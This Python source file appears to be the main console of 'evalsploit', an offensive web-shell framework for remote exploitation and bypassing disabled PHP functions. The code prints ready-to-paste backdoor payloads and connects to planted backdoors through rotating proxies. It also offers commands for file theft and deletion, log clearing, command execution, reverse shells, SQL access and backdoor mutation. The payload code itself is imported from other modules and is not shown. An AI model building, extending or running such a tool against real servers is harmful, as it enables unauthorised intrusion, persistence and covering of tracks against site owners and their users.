"""CLI loop: session selection at startup, command dispatch."""

from __future__ import annotations

import importlib.util
from pathlib import Path

from evalsploit.config import EvalsploitConfig, project_root
from evalsploit.context import SessionContext
from evalsploit.transport.send import send, ping_with_mode, SEND_MODES, validate_proxy
from evalsploit.transport.payloads import generate_backdoor
from evalsploit.modules.registry import COMMANDS, COMMAND_HELP

# Auto-load built-in modules (self-register via @register decorator)
_modules_pkg = Path(__file__).resolve().parent / "modules"
_mod_skip = {"__init__", "base", "registry"}
for _p in sorted(_modules_pkg.iterdir()):
    if _p.is_dir() and (_p / "__init__.py").exists() and not _p.name.startswith("_"):
        importlib.import_module(f"evalsploit.modules.{_p.name}")
    elif _p.suffix == ".py" and _p.stem not in _mod_skip and not _p.name.startswith("_"):
        try:
            importlib.import_module(f"evalsploit.modules.{_p.stem}")
        except Exception as _e:
            print(f"[evalsploit] Module {_p.name}: load failed - {_e}")

# Load user plugins from evalsploit/plugins/*.py
_plugins_dir = Path(__file__).resolve().parent / "plugins"
if _plugins_dir.exists():
    for _p in sorted(_plugins_dir.glob("*.py")):
        if _p.name.startswith("_"):
            continue
        try:
            _spec = importlib.util.spec_from_file_location(f"evalsploit.plugins.{_p.stem}", _p)
            if _spec and _spec.loader:
                _mod = importlib.util.module_from_spec(_spec)
                _spec.loader.exec_module(_mod)
        except Exception as _e:
            print(f"[evalsploit] Plugin {_p.name}: load failed - {_e}")

# Register help for built-in special commands (not in module registry)
COMMAND_HELP.update({
    "help":  ("Show help for all commands or a specific command", "help [command]"),
    "menu":  ("Return to startup menu (current session ends)", "menu"),
    "exit":  ("Exit evalsploit (with confirmation)", "exit"),
})

version = "3.1.0"

def show_main_menu(config: EvalsploitConfig) -> str:
    """Print startup menu and return choice: payload | session | url | last | exit."""

    print(f'''		   			                      	     
                                  ▄█                   ▄█           █▀   ▄█   	
         ▄▄▄▄  ▄▄▄▄ ▄▄▄▄  ▄▄▄▄    ██   ▄▄▄▄   ▄█ ▄▄▄   ██    ▄▄▄     ▄  ▄██▄  	
       ▄█▀▀▀▀█▌ ▀█▄  █▌  ▀▀ ▄██   ██  ▐██▀▀█▌ ███▀▀██  ██  ▄█▀▀██▄  ██   ██    
       ██▀▀▀▀▀   ▀█▄██   ▄██▀██▌  ██  ▄ ▀█▄▄  ██  ▄██  ██  ██▄▀ ██  ██   ██    
        ▀████▀    ▀██    ▀█▄▄██▀  █▀  ▀████▀  █████▀   █▀   ▀███▀   █▀   █▀    
       ▄                                      ██                           ▄ 	
        ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        {version}
                                               Remote exploitation and 
                                               Disabled functions bypass  
    ''')

    print()
    print("  1. Payload   - ready payload to paste (variants: classic / bypass / simple)")
    print("  2. Session   - choose from saved connections")
    print("  3. URL       - connect by address")
    print("  4. Last      - use last connection")
    print("  5. Proxies   - configure and validate proxy list")
    print("  0. Exit")
    print()
    line = input("Choice: ").strip()
    if line == "0":
        return "exit"
    if line == "1":
        return "payload"
    if line == "2":
        return "session"
    if line == "3":
        return "url"
    if line == "4" or line == "":
        return "last"
    if line == "5":
        return "proxy"
    return "last"  # fallback


def show_payload_variants(config: EvalsploitConfig) -> None:
    """Print payload variants (classic, simple, bypass) for current Z, V."""
    Z, V = config.Z, config.V
    print()
    print(f"Request params: Z={Z}, V={V} (must match settings when connecting)")
    print("-" * 60)

    classic_list = generate_backdoor("classic", Z, V)
    print("\n[ Classic (base64) ]")
    print(classic_list[0])

    simple_list = generate_backdoor("simple", Z, V)
    print("\n[ Simple (eval) ]")
    print(simple_list[0])

    bypass_list = generate_backdoor("bypass", Z, V)
    print("\n[ Bypass - variants ]")
    for i, payload in enumerate(bypass_list, 1):
        if payload.startswith("TMP-include:") or payload.startswith("Function bypass"):
            print(payload)
        else:
            print(payload)

    print("-" * 60)
    input("Press Enter to return to menu...")


def _validate_and_clean(config: EvalsploitConfig) -> None:
    """Validate all proxies in list, remove dead ones, set proxy_list_validated=True."""
    test_url = config.url if config.url else None
    working = []
    for px in config.proxy_list:
        ok = validate_proxy(px, test_url=test_url, timeout=10)
        print(f"  {'[V]' if ok else '[X]'} {px}")
        if ok:
            working.append(px)
    removed = len(config.proxy_list) - len(working)
    print(f"Checked {len(config.proxy_list)}: working {len(working)}, removed {removed}.")
    config.proxy_list = working
    config.proxy_dead.clear()
    config.proxy_list_validated = True
    config.save_global()


def show_proxy_menu(config: EvalsploitConfig) -> None:
    """Submenu: load proxies, validate, list, enable/disable, choose mode."""
    while True:
        print()
        print("  --- Proxies ---")
        status = "enabled" if config.proxy_enabled else "disabled"
        mode = "random" if config.proxy_use_index is None else f"#{config.proxy_use_index + 1}"
        validated_str = "yes" if config.proxy_list_validated else "no"
        print(f"  Status: {status} | mode: {mode} | list: {len(config.proxy_list)} | validated: {validated_str}")
        print()
        print("  1. Load from file  (first 20 proxies)")
        print("  2. Validate & clean  (keep only working)")
        print("  3. List proxies")
        print("  4. Enable proxy (random or by index)")
        print("  5. Disable proxy")
        print("  0. Back")
        print()
        line = input("Choice: ").strip()
        if line == "0":
            return
        if line == "1":
            if config.proxy_list:
                try:
                    confirm = input(
                        f"This will replace {len(config.proxy_list)} existing proxies. Continue? [y/N] "
                    ).strip().lower()
                except EOFError:
                    continue
                if confirm not in ("y", "yes"):
                    print("Cancelled.")
                    continue
            path_in = input("Path to file (host:port per line): ").strip()
            if not path_in:
                continue
            path = Path(path_in)
            if not path.is_absolute():
                path = project_root() / path_in
            if not path.exists():
                print("File not found.")
                continue
            lines = []
            for raw in path.read_text(encoding="utf-8", errors="ignore").splitlines():
                s = raw.strip()
                if not s or s.startswith("#"):
                    continue
                if ":" not in s:
                    print(f"  Skip (no ':'): {s[:50]!r}")
                    continue
                lines.append(s)
            if len(lines) > 20:
                print(f"  Warning: {len(lines)} proxies found, taking first 20.")
                lines = lines[:20]
            config.proxy_list = lines
            config.proxy_dead.clear()
            config.proxy_list_validated = False
            config.save_global()
            print(f"Loaded {len(config.proxy_list)} proxies.")
            try:
                do_check = input("Run auto-check now? [y/N] ").strip().lower()
            except EOFError:
                do_check = ""
            if do_check in ("y", "yes"):
                _validate_and_clean(config)
        elif line == "2":
            if not config.proxy_list:
                print("List empty. Load from file first.")
                continue
            _validate_and_clean(config)
        elif line == "3":
            if not config.proxy_list:
                print("List empty.")
                continue
            for i, px in enumerate(config.proxy_list, 1):
                print(f"  {i}. {config.proxy_status(px)} {px}")
        elif line == "4":
            if not config.proxy_list:
                print("List empty. Load from file first.")
                continue
            config.proxy_enabled = True
            mode_in = input("Mode: 1 - random (default), 2 - by index. Enter = random: ").strip() or "1"
            if mode_in == "2":
                for i, px in enumerate(config.proxy_list, 1):
                    print(f"  {i}. {config.proxy_status(px)} {px}")
                num_in = input(f"Proxy number (1..{len(config.proxy_list)}): ").strip()
                try:
                    n = int(num_in)
                    if 1 <= n <= len(config.proxy_list):
                        config.proxy_use_index = n - 1
                        print(f"Using proxy #{n}: {config.proxy_list[n - 1]}")
                    else:
                        config.proxy_use_index = None
                        print("Invalid number, random mode enabled.")
                except ValueError:
                    config.proxy_use_index = None
                    print("Random mode enabled.")
            else:
                config.proxy_use_index = None
                print("Mode: random (one per session).")
            config.clear_proxy_session_cache()
            config.save_global()
        elif line == "5":
            config.proxy_enabled = False
            config.clear_proxy_session_cache()
            config.save_global()
            print("Proxies disabled.")


def _create_context(config: EvalsploitConfig) -> SessionContext:
    """Create SessionContext and set initial pwd (skipped when config.silent)."""
    ctx = SessionContext(config, send)
    if not config.silent:
        try:
            out = ctx.send("echo __DIR__;")
            pwd = out.strip()
            if pwd == "/tmp":
                pwd = ctx.send("echo getcwd();").strip()
            ctx.pwd = pwd or "/"
        except Exception:
            ctx.pwd = "/"
    return ctx


def run_startup(config: EvalsploitConfig) -> SessionContext | None:
    """Startup menu loop: payload / session / url / last / exit. Return context or None."""
    config.load_global()
    sessions = config.list_sessions()

    while True:
        choice = show_main_menu(config)

        if choice == "exit":
            return None

        if choice == "payload":
            show_payload_variants(config)
            continue

        if choice == "session":
            if not sessions:
                print("No saved sessions.")
                continue
            print("Saved sessions:")
            for i, name in enumerate(sessions, 1):
                print(f"  {i}. {name}")
            line = input("Number or session name: ").strip()
            if line.isdigit():
                idx = int(line)
                if 1 <= idx <= len(sessions):
                    config.load_session(sessions[idx - 1])
                    print(f"Loaded session: {sessions[idx - 1]}")
                else:
                    print("Invalid number.")
                    continue
            elif line in sessions:
                config.load_session(line)
                print(f"Loaded session: {line}")
            else:
                print("Session not found.")
                continue

        if choice == "url":
            url = input("URL: ").strip()
            if not url:
                print("URL not specified.")
                continue
            config.url = url
            z_in = input("Z (Enter = keep current): ").strip()
            if z_in:
                config.Z = z_in
            v_in = input("V (Enter = keep current): ").strip()
            if v_in:
                config.V = v_in

        if choice == "last":
            if not config.url:
                print("No saved URL. Choose session or enter URL.")
                continue
            print(f"Using: {config.url}")

        if choice == "proxy":
            show_proxy_menu(config)
            continue

        if choice in ("session", "url", "last") and config.url:
            return _create_context(config)


def run_loop(ctx: SessionContext) -> str:
    """Main command loop. Returns 'exit' to quit program, 'menu' to return to startup menu."""
    exit_reason = "exit"
    while True:
        try:
            line = input("evalsploit> ").strip()
        except EOFError:
            break
        if not line:
            continue
        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        if cmd == "exit":
            try:
                ans = input("Quit the program? [y/N] ").strip().lower()
            except EOFError:
                ans = ""
            if ans in ("y", "yes"):
                break
            continue
        if cmd == "menu":
            try:
                ans = input("Return to main menu? Current session will end. [y/N] ").strip().lower()
            except EOFError:
                ans = ""
            if ans in ("y", "yes"):
                exit_reason = "menu"
                break
            continue
        if cmd == "help":
            if args.strip():
                c = args.strip().lower().split()[0]
                if c in COMMAND_HELP:
                    desc, usage = COMMAND_HELP[c]
                    print(f"  {c}: {desc}")
                    print(f"  Usage: {usage}")
                elif c in COMMANDS:
                    print(f"  {c}: alias — use 'help' for full list")
                else:
                    print(f"Unknown command: {c!r}. Type help for full list.")
            else:
                print_help()
            continue

        mod_cls = COMMANDS.get(cmd)
        if mod_cls is None:
            print(f"Unknown command: {cmd}. Type help.")
            continue
        try:
            mod_cls().run(ctx, args)
        except Exception as e:
            print(f"Error: {e}")

    return exit_reason


_HELP_GROUPS = [
    ("Navigation", ["cd", "pwd", "home"]),
    ("Files",      ["ls", "cat", "grep", "find", "rm", "cp", "ren", "stat", "touch", "mkdir",
                    "create", "download", "upload", "edit", "clearlog"]),
    ("Execution",  ["run", "php", "exploit", "try", "reverse", "sql"]),
    ("Backdoor",   ["gen", "mutate", "ping"]),
    ("Recon",      ["info", "scan"]),
    ("Session",    ["config", "set", "sessions", "save", "connect", "proxy_switch"]),
    ("Console",    ["help", "menu", "exit"]),
]


def print_help() -> None:
    # Build alias map: cmd → primary (for commands without COMMAND_HELP entry)
    primary_set = set(COMMAND_HELP.keys())
    aliases = sorted(c for c in COMMANDS if c not in primary_set)

    for group_name, cmds in _HELP_GROUPS:
        available = [c for c in cmds if c in COMMAND_HELP]
        if not available:
            continue
        print(f"\n  [{group_name}]")
        for cmd in available:
            desc, usage = COMMAND_HELP[cmd]
            print(f"  {cmd:<14} {desc}")
            print(f"  {'':14} Usage: {usage}")

    # Plugins (registered but not in any group)
    grouped = {c for _, cmds in _HELP_GROUPS for c in cmds}
    plugin_cmds = sorted(c for c in COMMAND_HELP if c not in grouped)
    if plugin_cmds:
        print("\n  [Plugins]")
        for cmd in plugin_cmds:
            desc, usage = COMMAND_HELP[cmd]
            print(f"  {cmd:<14} {desc}")
            print(f"  {'':14} Usage: {usage}")

    if aliases:
        print(f"\n  Aliases: {', '.join(aliases)}")
    print()


def _ping_on_connect(ctx: SessionContext) -> None:
    """Try ping with current send_mode, then other modes; set and save working mode."""
    config = ctx.config
    order = [config.send_mode] + [m for m in SEND_MODES if m != config.send_mode]
    for mode in order:
        ok, ms = ping_with_mode(ctx, mode)
        if ok:
            config.send_mode = mode
            config.save_global()
            print(f"Backdoor OK ({ms} ms), send: {mode}")
            return
    print("Backdoor unreachable (tried bypass, classic, simple)")


def main() -> None:
    config = EvalsploitConfig()
    while True:
        ctx = run_startup(config)
        if ctx is None:
            return
        config.save_global()
        if not config.silent:
            _ping_on_connect(ctx)
            print(f"Active directory: {ctx.pwd}")
        print()
        result = run_loop(ctx)
        if result == "exit":
            return
        # result == "menu" - loop again, show startup menu


if __name__ == "__main__":
    main()
